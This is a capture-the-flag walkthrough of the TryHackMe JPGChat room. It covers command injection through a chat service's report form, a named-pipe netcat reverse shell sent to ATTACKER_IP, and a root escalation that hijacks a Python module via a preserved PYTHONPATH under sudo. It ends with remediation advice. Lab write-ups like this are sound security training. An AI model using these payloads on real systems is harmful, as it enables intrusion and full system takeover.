# JPGChat

Room: https://tryhackme.com/room/jpgchat

Exploiting poorly made custom chatting service written in a certain language...

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/JPGChat.md

---

# JPChat Walkthrough

## Summary

JPChat exposes a custom TCP chat service on port 3000. Nmap does not recognise the service and labels it as `ppp?`, but the banner clearly identifies it as JPChat.

The service banner also gives a useful hint that the source code can be found on the admin's GitHub. After locating the source code, the report feature is found to pass user input directly into `os.system`, allowing command injection.

The command injection gives a shell as the `wes` user. Privilege escalation is then achieved through a sudo misconfiguration where `wes` can run a Python script as root while preserving `PYTHONPATH`. By hijacking the imported `compare` module, we can spawn a root shell.

---

## Enumeration

Initial scanning found port 3000 open.

```text
3000/tcp open  ppp?
1 service unrecognized despite returning data.
```

The Nmap fingerprint showed the service banner.

```text
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the currently only channel
REPORT USAGE: use [REPORT] to report someone to the admins with proof
```

Nmap guessed `ppp?`, but the returned banner showed this was actually a custom chat service.

To make commands easier, the target IP was saved as an environment variable.

```bash
export TARGET=10.67.141.246
```

Connecting to the service with Netcat confirmed the banner.

```bash
nc $TARGET 3000
```

Output:

```text
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

The useful clue was this line:

```text
the source code of this service can be found at our admin's github
```

This suggested the next step was to search for the source code rather than attack the service blindly.

---

## Source Code Discovery

The JPChat source code was found on GitHub.

```text
https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py
```

The vulnerable code was inside the report feature.

```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

    print ('this report will be read by Mozzie-jpg')
    your_name = input('your name:\n')
    report_text = input('your report:\n')
    os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
    os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

    print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
    print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
    message = input('')

    if message == '[REPORT]':
        report_form()
    if message == '[MESSAGE]':
        print ('There are currently 0 other users logged in')
        while True:
            message2 = input('[MESSAGE]: ')
            if message2 == '[REPORT]':
                report_form()

chatting_service()
```

The issue is here:

```python
os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

Both `your_name` and `report_text` are inserted directly into shell commands without sanitisation.

This allows command injection.

---

## Initial Foothold

A Netcat listener was started on the attacking machine.

```bash
nc -lvnp 4444
```

Then JPChat was opened again.

```bash
nc $TARGET 3000
```

Inside the service, the report feature was selected.

```text
[REPORT]
```

The payload used was:

```bash
test';mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f;'
```

This breaks out of the intended `echo` command and executes a named pipe reverse shell.

Listener output:

```text
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.67.141.246 41014
bash: cannot set terminal process group (1437): Inappropriate ioctl for device
bash: no job control in this shell
wes@ubuntu-xenial:/$
```

A shell was gained as `wes`.

---

## User Flag

The user flag was located in the `wes` home directory.

```bash
cat user.txt
```

Output:

```text
wes@ubuntu-xenial:~$ cat user.txt
cat user.txt
JPC{REDACTED}
```

---

## Privilege Escalation Enumeration

The next step was to check sudo permissions.

```bash
sudo -l
```

Output:

```text
wes@ubuntu-xenial:~$ sudo -l
sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

This reveals the privilege escalation path.

Important parts:

```text
env_keep+=PYTHONPATH
```

```text
(root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```

The user `wes` can run a Python script as root without a password, and `PYTHONPATH` is preserved.

This is dangerous because Python uses `PYTHONPATH` when searching for imported modules.

---

## Inspecting the Python Script

The allowed script was inspected.

```bash
cat /opt/development/test_module.py
```

Output:

```text
wes@ubuntu-xenial:~$ cat /opt/development/test_module.py
cat /opt/development/test_module.py
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
wes@ubuntu-xenial:~$
```

The script imports from a module called `compare`.

Since `PYTHONPATH` can be controlled, a malicious `compare.py` can be placed in `/tmp`, then Python can be forced to load that module first.

---

## Python Module Hijacking

A malicious module was created at `/tmp/compare.py`.

```bash
cat > /tmp/compare.py << 'EOF'
import os

class compare:
    @staticmethod
    def Str(a, b, c):
        os.system("/bin/bash")
EOF
```

This creates the expected `compare.Str` structure, but instead of comparing strings, it spawns `/bin/bash`.

The sudo command was then run with `PYTHONPATH` pointing to `/tmp`.

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
```

Output:

```text
wes@ubuntu-xenial:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
<YTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py
root@ubuntu-xenial:~#
```

A root shell was gained.

---

## Root Flag

From the root shell, the root directory was checked.

```bash
cd /root
ls
cat root.txt
```

Output:

```text
root@ubuntu-xenial:~# cd /root
cd /root
root@ubuntu-xenial:/root# ls
ls
root.txt
root@ubuntu-xenial:/root# cat root.txt
cat root.txt
JPC{REDACTED}

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
root@ubuntu-xenial:/root#
```

---

## Attack Chain

1. Enumerated port 3000.
2. Identified a custom TCP service called JPChat.
3. Read the service banner.
4. Noted the GitHub source code hint.
5. Found the JPChat source code online.
6. Found unsafe `os.system` usage in the report feature.
7. Injected a reverse shell through the report form.
8. Gained a shell as `wes`.
9. Read the user flag.
10. Checked sudo privileges.
11. Found `wes` could run a Python script as root with `PYTHONPATH` preserved.
12. Inspected the script and found it imported `compare`.
13. Created a malicious `/tmp/compare.py`.
14. Ran the sudo command with `PYTHONPATH=/tmp`.
15. Gained a root shell.
16. Read the root flag.

---

## Key Takeaways

The initial foothold came from source code review. The service banner directly hinted that the source code was available on GitHub.

The vulnerability existed because user input was placed directly into `os.system` calls. This allowed command injection through the report feature.

Privilege escalation worked because sudo allowed `wes` to run a Python script as root while preserving `PYTHONPATH`. Since the script imported a module by name, Python module hijacking could be used to execute code as root.

---

## Fixes

The command injection could be fixed by avoiding `os.system` and writing to the file directly with Python.

Example safer approach:

```python
with open('/opt/jpchat/logs/report.txt', 'w') as f:
    f.write(your_name + '\n')
    f.write(report_text + '\n')
```

The privilege escalation issue could be fixed by removing `env_keep+=PYTHONPATH`, avoiding `SETENV` unless required, and making sure root-run Python scripts do not import modules from user-controlled paths.
